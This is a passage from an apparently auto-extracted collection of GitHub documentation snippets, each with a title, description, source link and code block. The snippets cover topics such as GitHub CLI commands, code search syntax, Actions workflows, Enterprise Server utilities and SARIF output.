command uses the GitHub CLI to query the GitHub API and retrieve details about a specific codespace, including its current machine type.  The `CODESPACE-NAME` placeholder should be replaced with the actual name of the codespace. The `codespace` scope might be requested.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-machine-type-for-your-codespace.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh api /user/codespaces/CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Organization Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to use the `org:` qualifier to search for files within an organization. It searches for files within the github organization.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_10\n\nLANGUAGE: text\nCODE:\n```\norg:github\n```\n\n----------------------------------------\n\nTITLE: Unique Header Examples: Option 2\nDESCRIPTION: Shows how to use unique H2 and H3 headers across different sections.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_14\n\nLANGUAGE: Markdown\nCODE:\n```\n## Prompts for writing code (H2)\n\nTEXT\n\n### Example (H3)\n\nTEXT\n\n## Prompts for writing tests (H2)\n\nTEXT\n\n### Example (H3)\n\nTEXT\n```\n\n----------------------------------------\n\nTITLE: Define domains for essential operations\nDESCRIPTION: These domains are essential for the basic operation of GitHub Actions, enabling communication and core functionalities.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngithub.com\napi.github.com\n*.actions.githubusercontent.com\n```\n\n----------------------------------------\n\nTITLE: Show remote repositories using Git\nDESCRIPTION: This command lists the configured remote repositories for the current Git repository. It's used to verify the configured remotes.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit remote -v\n```\n\n----------------------------------------\n\nTITLE: Removing a Temporary Local Repository\nDESCRIPTION: Removes the temporary local repository created during the mirroring process. This command is typically run after the mirror-push is complete.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncd ..\nrm -rf OLD-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Starting Runner Service - macOS\nDESCRIPTION: Starts the self-hosted runner service on macOS systems using `svc.sh`.  Requires the user to be in the directory where the runner application is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh start\n```\n\n----------------------------------------\n\nTITLE: WebUI Section Liquid Tag\nDESCRIPTION: Defines another section of content specific to `webui`. It is used to display webui specific content in another section.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-specific.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n{% webui %}\n\n## Webui section\n\nWebui section specific content\n\n{% endwebui %}\n```\n\n----------------------------------------\n\nTITLE: Displaying Version (ghe-version)\nDESCRIPTION: This utility prints the version, platform, and build information of the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_31\n\nLANGUAGE: Shell\nCODE:\n```\nghe-version\n```\n\n----------------------------------------\n\nTITLE: Copying Azure Storage Data\nDESCRIPTION: This command copies all containers, directories, and blobs from a source Azure storage account to a destination Azure storage account using `azcopy`. The `--recursive` flag ensures that all subdirectories and files are included in the copy operation.  SAS tokens are used for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/using-a-staging-environment.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nazcopy copy 'https://SOURCE-STORAGE-ACCOUNT-NAME.blob.core.windows.net/SAS-TOKEN' 'https://DESTINATION-STORAGE-ACCOUNT-NAME.blob.core.windows.net/' --recursive\n```\n\n----------------------------------------\n\nTITLE: Adding YAML frontmatter to a new post - Shell\nDESCRIPTION: This snippet demonstrates the YAML frontmatter for a new post in a Jekyll site. It includes the layout, title, date, and categories.  The 'layout' is set to 'post'. The 'date' follows the YYYY-MM-DD hh:mm:ss -0000 format.  Categories are space-separated. The title is enclosed in quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/adding-content-to-your-github-pages-site-using-jekyll.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nlayout: post\n   title: \"POST-TITLE\"\n   date: YYYY-MM-DD hh:mm:ss -0000\n   categories: CATEGORY-1 CATEGORY-2\n```\n\n----------------------------------------\n\nTITLE: Forwarding traffic to local server using ngrok with static domain\nDESCRIPTION: This command uses ngrok to create a tunnel to forward traffic from a custom ngrok domain to your local server. Replace `YOUR-STATIC-DOMAIN.ngrok-free.app` with your static domain and `EXTENSION-PORT-NUMBER` with the port your extension is running on. This command allows you to access your local server with a consistent ngrok URL.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/creating-a-copilot-extension/configuring-your-server-to-host-your-copilot-extension.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nngrok http --domain=YOUR-STATIC-DOMAIN.ngrok-free.app EXTENSION-PORT-NUMBER\n```\n\n----------------------------------------\n\nTITLE: Initializing Git Repository in Shell\nDESCRIPTION: This shell command initializes a new, empty Git repository in the specified REPOSITORY-NAME folder.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit init REPOSITORY-NAME\n```\n\n----------------------------------------\n\nTITLE: Case-sensitive Search with Regular Expressions\nDESCRIPTION: This snippet demonstrates how to perform a case-sensitive search for the string \"True\" using a regular expression with case insensitivity turned off.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_30\n\nLANGUAGE: text\nCODE:\n```\n/(?-i)True/\n```\n\n----------------------------------------\n\nTITLE: Managing Repository Replication (ghe-spokesctl)\nDESCRIPTION: This command allows you to manage repository replication on distributed Git servers. Without arguments, it provides a general interface for interacting with the replication service.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_48\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple JavaScript File\nDESCRIPTION: This JavaScript code snippet creates an `index.js` file with a basic `console.log` statement. This will output \"Hello, World!\" to the console when the script is executed.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconsole.log(\"Hello, World!\");\n```\n\n----------------------------------------\n\nTITLE: Configuring AWS IAM Role Trust Policy with OIDC Sub Condition (JSON)\nDESCRIPTION: This JSON snippet demonstrates how to configure the trust policy for an AWS IAM role when using OpenID Connect (OIDC) to allow GitHub to write audit logs to an S3 bucket. The `sub` field is added to the validation conditions to ensure that only the specified GitHub Enterprise account is authorized to assume the role.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/streaming-the-audit-log-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n     \"Condition\": {\n        \"StringEquals\": {\n           \"oidc-configuration.audit-log.githubusercontent.com:aud\": \"sts.amazonaws.com\",\n           \"oidc-configuration.audit-log.githubusercontent.com:sub\": \"https://github.com/ENTERPRISE\"\n         }\n      }\n      }\n```\n\n----------------------------------------\n\nTITLE: Getting Playwright Test Help\nDESCRIPTION: This command displays help information for the Playwright test command, guiding users on available options.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- --help\n```\n\n----------------------------------------\n\nTITLE: Exiting SSH Connection\nDESCRIPTION: This snippet displays the command to close the SSH connection to the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ exit\n> logout\n> Connection to HOSTNAME closed.\n```\n\n----------------------------------------\n\nTITLE: Define domains for publishing immutable actions\nDESCRIPTION: This domain is required to publish immutable actions. Necessary for ensuring the integrity and immutability of actions.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghcr.io\n```\n\n----------------------------------------\n\nTITLE: Executing gh config command\nDESCRIPTION: This snippet shows how to execute the gh config command to view the configuration settings. No dependencies are required.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/github-cli-reference.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh config\n```\n\n----------------------------------------\n\nTITLE: Displaying the help menu\nDESCRIPTION: This command displays the help menu for the content linter script, showing available options and arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- --help\n```\n\n----------------------------------------\n\nTITLE: Setting Docker labels in Dockerfile\nDESCRIPTION: This code snippet demonstrates how to use the `LABEL` instruction in a Dockerfile to add metadata to a container image.  It sets the image source, description, and license using pre-defined annotation keys. The image source URL depends on whether the environment is GitHub Enterprise Cloud or a self-hosted instance.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_11\n\nLANGUAGE: dockerfile\nCODE:\n```\nLABEL org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/octocat/my-repo\nLABEL org.opencontainers.image.description=\"My container image\"\nLABEL org.opencontainers.image.licenses=MIT\n```\n\n----------------------------------------\n\nTITLE: Copying SSH Public Key to Clipboard (macOS)\nDESCRIPTION: Copies the content of the id_ed25519.pub file to the clipboard on macOS using the `pbcopy` command. This command requires the `pbcopy` utility, which is standard on macOS.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-ssh-public-key.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ pbcopy < ~/.ssh/id_ed25519.pub\n# Copies the contents of the id_ed25519.pub file to your clipboard\n```\n\n----------------------------------------\n\nTITLE: Define a Single-Dimension Matrix in GitHub Actions YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow with a single-dimension matrix named 'version'. The matrix contains a list of values [10, 12, 14]. The workflow creates three jobs, each iterating over the 'version' values. The 'matrix.version' context is used to access the current value within each job and pass it as the 'node-version' parameter to the 'actions/setup-node' action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/single-dimension-matrix.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.version }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to use the `path:` qualifier to search within file paths. It searches for files containing the term `unit_tests` in their path.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_13\n\nLANGUAGE: text\nCODE:\n```\npath:unit_tests\n```\n\n----------------------------------------\n\nTITLE: Adding Ruby interpreter shebang\nDESCRIPTION: This line specifies that the Ruby interpreter should be used to execute the script. It's placed at the top of the `app_cli.rb` file to ensure the script is run with Ruby.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n#!/usr/bin/env ruby\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub codespace using gh codespace create\nDESCRIPTION: This command initiates the creation of a new codespace.  It will guide the user via an interactive session.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace create\n```\n\n----------------------------------------\n\nTITLE: Extending Storage (ghe-storage-extend)\nDESCRIPTION: This script extends the user volume on platforms where it is required. Refer to documentation for details.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_30\n\nLANGUAGE: Shell\nCODE:\n```\nghe-storage-extend\n```\n\n----------------------------------------\n\nTITLE: Analyzing Git Operations with ghe-btop\nDESCRIPTION: The `ghe-btop` command provides a real-time view of current Git operations running on the GitHub Enterprise Server appliance. It's useful for identifying processes that are consuming excessive resources, such as long-running clones or pushes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-btop\n```\n\n----------------------------------------\n\nTITLE: Installing Bundler dependencies\nDESCRIPTION: These shell commands are used to install bundler and install dependencies for the ruby application.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\ngem install bundler\n```\n\nLANGUAGE: shell\nCODE:\n```\nbundle install\n```\n\n----------------------------------------\n\nTITLE: Running the linter on staged files\nDESCRIPTION: This command runs the content linter on staged and changed files. It reports both warnings and errors.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_TARGET_BRANCH_SHA to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_TARGET_BRANCH_SHA` to the GitHub Actions equivalent `${{ github.event.pull_request.base.sha }}`. Base sha.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_71\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.base.sha }}\n```\n\n----------------------------------------\n\nTITLE: Empty Subversion Checkout\nDESCRIPTION: This snippet shows how to perform an empty checkout of a GitHub repository using Subversion. It checks out only the repository structure without downloading any files, which is useful for repositories with many branches and tags to avoid unnecessary bandwidth usage. It requires the svn client to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ svn co --depth empty https://github.com/USER/REPO\n> Checked out revision 1.\n$ cd REPO\n```\n\n----------------------------------------\n\nTITLE: Debugging JSON Parse Error Example\nDESCRIPTION: This example demonstrates a JSON parsing error caused by an incomplete string value. The error message indicates that the parser is expecting a string but encounters 'undefined'.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/debugging-errors/debugging-invalid-json.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nError: Parse error\n----------------------^\nExpecting 'STRING', 'NUMBER', 'NULL', 'TRUE', 'FALSE', '{', '[', got 'undefined'\n```\n\n----------------------------------------\n\nTITLE: Example update output\nDESCRIPTION: Shows example output from updating the GitHub Actions Importer. Confirms the ghcr.io/actions-importer/cli:latest image is up-to-date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Defining Versions in YAML Frontmatter\nDESCRIPTION: This YAML snippet demonstrates how to specify the versions to which a documentation page applies. It includes examples for applying to all versions of Free, Pro, & Team and GitHub Enterprise Server, as well as specifying a range of releases. The `versions` property is crucial for versioning documentation.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: About your personal dashboard\nversions:\n  fpt: '*'\n  ghes: '>=3.11'\n```\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Downloading your license\nversions:\n  ghes: '*'\n```\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghes: '>=3.1 <3.3'\n```\n\n----------------------------------------\n\nTITLE: Managing SAML Mappings with ghe-saml-mapping-csv (Shell)\nDESCRIPTION: The `ghe-saml-mapping-csv` utility allows administrators to output or update the SAML NameID mappings for users. It can output a CSV file of mappings and update mappings based on changes made to the CSV. Options include `-d` to output a CSV, `-u` to update mappings, `-n` for a dry run, and `-f` to specify the file path.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_17\n\nLANGUAGE: shell\nCODE:\n```\nghe-saml-mapping-csv -d\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-saml-mapping-csv -u -n -f /PATH/TO/FILE\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-saml-mapping-csv -u -f /PATH/TO/FILE\n```\n\n----------------------------------------\n\nTITLE: Measuring the total size of files with git-sizer\nDESCRIPTION: This snippet uses `git-sizer` and `jq` to determine the total size of all unique files (blobs) in the repository, in bytes. The `--no-progress` flag suppresses progress output. The `-j` flag makes `git-sizer` generate JSON output. The `jq \".unique_blob_size\"` command extracts the value of the `unique_blob_size` field from the JSON output.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/overview/planning-your-migration-to-github.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngit-sizer --no-progress -j | jq \".unique_blob_size\"\n```\n\n----------------------------------------\n\nTITLE: Get Article Body - cURL\nDESCRIPTION: This cURL command retrieves the body content of an article from the `/api/article/body` endpoint. It requires the `pathname` parameter specifying the article path. The command returns the article's body content in markdown format.\nSOURCE: https://github.com/github/docs/blob/main/src/article-api/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s https://docs.github.com/api/article/body\\?pathname=/en/get-started/start-your-journey/about-github-and-git\n```\n\nLANGUAGE: text\nCODE:\n```\n## About GitHub\n\nGitHub is a cloud-based platform where you can store, share, and work together with others to write code.\n\nStoring your code in a \"repository\" on GitHub allows you to:\n[...]\n```\n\n----------------------------------------\n\nTITLE: Setting Default Platform in YAML Frontmatter\nDESCRIPTION: This YAML snippet illustrates how to override the initial platform selection for a documentation page using the `defaultPlatform` property. It showcases setting the default platform to Linux.  This ensures the correct platform-specific content is displayed initially, irrespective of the reader's operating system.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ndefaultPlatform: linux\n```\n\n----------------------------------------\n\nTITLE: Environment Variable Configuration for Translations\nDESCRIPTION: This snippet illustrates how to configure environment variables to map the location of translation repositories. Each language has its own environment variable pointing to the respective translation directory. The `TRANSLATIONS` variable serves as the root for all translation repositories.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/deprecation-steps.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nTRANSLATIONS=/Users/mona/repos/github-repos/translations\nTRANSLATIONS_ROOT_ES_ES=${TRANSLATIONS}/docs-internal.es-es\nTRANSLATIONS_ROOT_JA_JP=${TRANSLATIONS}/docs-internal.ja-jp\nTRANSLATIONS_ROOT_PT_BR=${TRANSLATIONS}/docs-internal.pt-br\nTRANSLATIONS_ROOT_ZH_CN=${TRANSLATIONS}/docs-internal.zh-cn\nTRANSLATIONS_ROOT_RU_RU=${TRANSLATIONS}/docs-internal.ru-ru\nTRANSLATIONS_ROOT_FR_FR=${TRANSLATIONS}/docs-internal.fr-fr\nTRANSLATIONS_ROOT_KO_KR=${TRANSLATIONS}/docs-internal.ko-kr\nTRANSLATIONS_ROOT_DE_DE=${TRANSLATIONS}/docs-internal.de-de\n```\n\n----------------------------------------\n\nTITLE: Regex pattern for Semantic Versioning tag names\nDESCRIPTION: This regular expression validates tag names against the Semantic Versioning specification. It checks for a version number format like X.Y.Z, optionally followed by a pre-release or build metadata string. It must be used with the \"Must match a given regex pattern\" requirement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/rulesets-commit-regex.md#_snippet_1\n\nLANGUAGE: regex\nCODE:\n```\n^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)(?:-((?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\\.(?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\\+([0-9a-zA-Z-]+(?:\\.[0-9a-zA-Z-]+)*))?$\n```\n\n----------------------------------------\n\nTITLE: Running REST Pipeline Locally\nDESCRIPTION: This snippet describes how to execute the REST pipeline locally for development and testing.  It requires cloning the `github/rest-api-description` repository, setting a `GITHUB_TOKEN` environment variable, and running the `npm run sync-rest` script. The `-s` parameter specifies the source directory, and the `-o` parameter specifies the output directory, which defaults to `rest`.\nSOURCE: https://github.com/github/docs/blob/main/src/rest/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run sync-rest -- -s rest-api-description -o rest\n```\n\n----------------------------------------\n\nTITLE: Adding GPG Key to Bashrc - Shell\nDESCRIPTION: This snippet adds the GPG key to the `.bashrc` startup file on Linux. It checks if the `.bashrc` file exists and then appends the command to export the `GPG_TTY` environment variable. This allows GPG to interact with the terminal for passphrase prompts. The snippet is intended for Linux systems.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/telling-git-about-your-signing-key.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n[ -f ~/.bashrc ] && echo -e '\\nexport GPG_TTY=$(tty)' >> ~/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Repository Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to use the `repo:` qualifier to search within a specific repository. It searches within the github-linguist/linguist repository.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nrepo:github-linguist/linguist\n```\n\n----------------------------------------\n\nTITLE: SARIF with Relative URI Example\nDESCRIPTION: This SARIF output file demonstrates the use of relative URIs and the `originalUriBaseIds` property, which is required for producing a valid SARIF output when using relative URI references. It includes the schema, version, runs, tool, driver, rules, originalUriBaseIds, results, locations, physicalLocation, artifactLocation, region, and partialFingerprints.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n  \"version\": \"2.1.0\",\n  \"runs\": [\n    {\n      \"tool\": {\n        \"driver\": {\n          \"name\": \"Tool Name\",\n          \"rules\": [\n            {\n              \"id\": \"R01\"\n                      ...\n              \"properties\" : {\n                 \"id\" : \"java/unsafe-deserialization\",\n                 \"kind\" : \"path-problem\",\n                 \"name\" : \"...\",\n                 \"problem.severity\" : \"error\",\n                 \"security-severity\" : \"9.8\",\n               }\n            }\n          ]\n        }\n      },\n      \"originalUriBaseIds\": {\n        \"PROJECTROOT\": {\n         \"uri\": \"file:///C:/Users/Mary/code/TheProject/\",\n           \"description\": {\n             \"text\": \"The root directory for all project files.\"\n           }\n        },\n         \"%SRCROOT%\": {\n           \"uri\": \"src/\",\n           \"uriBaseId\": \"PROJECTROOT\",\n           \"description\": {\n             \"text\": \"The root of the source tree.\"\n           }\n         }\n      },\n      \"results\": [\n        {\n          \"ruleId\": \"R01\",\n          \"message\": {\n            \"text\": \"Result text. This result does not have a rule associated.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"fileURI\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 2,\n                  \"startColumn\": 7,\n                  \"endColumn\": 10\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"39fa2ee980eb94b0:1\"\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Expanding URI Templates with Ruby\nDESCRIPTION: This Ruby snippet demonstrates how to expand URI templates using the `uri_template` gem. It creates a new `URITemplate` object with a template string and then expands it with different parameters.  The example shows expanding the template with no parameters, with the `all` parameter set to 1, and with both the `all` and `participating` parameters set to 1. Requires the `uri_template` gem.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\n>> tmpl = URITemplate.new('/notifications{?since,all,participating}')\n>> tmpl.expand\n=> \"/notifications\"\n\n>> tmpl.expand all: 1\n=> \"/notifications?all=1\"\n\n>> tmpl.expand all: 1, participating: 1\n=> \"/notifications?all=1&participating=1\"\n```\n\n----------------------------------------\n\nTITLE: Synchronize Spoon-Knife Subtree\nDESCRIPTION: Example usage of git pull to synchronize the spoon-knife subtree with the main branch of the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngit pull -s subtree spoon-knife main\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: Bash\nDESCRIPTION: This code snippet demonstrates how to use the `bash` tag to display content relevant to Bash shell commands. It wraps instructions specific to using Bash.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_10\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% bash %}\n\nThese instructions are pertinent to Bash shell commands.\n\n{% endbash %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Examining Git Commit Email Address\nDESCRIPTION: This snippet demonstrates how to check the email address used for a Git commit by appending `.patch` to the commit URL. The email address used for the commit is displayed in the `From:` field of the resulting patch file. This is a crucial step in verifying that the commit is associated with a GitHub account.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-settings-on-your-profile/why-are-my-contributions-not-showing-up-on-my-profile.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nFrom 67c0afc1da354d8571f51b6f0af8f2794117fd10 Mon Sep 17 00:00:00 2001\nFrom: The Octocat <octocat@nowhere.com>\nDate: Sun, 27 Apr 2014 15:36:39 +0530\nSubject: [PATCH] updated index for better welcome message\n```\n\n----------------------------------------\n\nTITLE: BQRS File Hashing using CodeQL CLI\nDESCRIPTION: Computes a stable hash of a BQRS file using the `codeql bqrs hash` command. The `<file>` argument specifies the BQRS file to be hashed. This command is useful for internal plumbing and requires the CodeQL CLI to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/bqrs-hash.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql bqrs hash <options>... -- <file>\n```\n\n----------------------------------------\n\nTITLE: Running Fixture Development Server with npm\nDESCRIPTION: This command starts a local development server using fixture content, allowing you to preview changes before writing tests. The server runs at http://localhost:4000.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/README.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm run fixture-dev\n```\n\n----------------------------------------\n\nTITLE: Audit log pagination link example\nDESCRIPTION: This is an example of the `link` header returned by the audit log API when using cursor-based pagination. It includes URLs for fetching the next, first, and previous pages of results. These URLs can be used in subsequent requests to navigate through the audit log events.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nlink: <{% data variables.product.rest_url %}/enterprises/13827/audit-log?%3A2022-11-01=&per_page=100&after=MS42NjQzODMzNTk5MjdlKzEyfDloQzBxdURzaFdVbVlLWjkxRU9mNXc%3D&before=>; rel=\"next\",\n<{% data variables.product.rest_url %}/enterprises/13827/audit-log?%3A2022-11-01=&per_page=100&after=&before=>; rel=\"first\",\n<{% data variables.product.rest_url %}/enterprises/13827/audit-log?%3A2022-11-01=&per_page=100&after=&before=MS42Njc4NDA2MjM4MzNlKzEyfExqeG5sUElvNEZMbG1XZHA5akdKTVE%3D>; rel=\"prev\"\n```\n\n----------------------------------------\n\nTITLE: Creating Collapsed Section in Markdown\nDESCRIPTION: This snippet demonstrates how to create a collapsed section in Markdown using the `<details>` and `<summary>` tags.  The content within the `<details>` tags is hidden by default and can be expanded by the reader. The `<summary>` tag provides a label for the collapsed section.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-collapsed-sections.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n<details>\n\n<summary>Tips for collapsed sections</summary>\n\n### You can add a header\n\nYou can add text within a collapsed section.\n\nYou can add an image or a code block, too.\n\n```ruby\n   puts 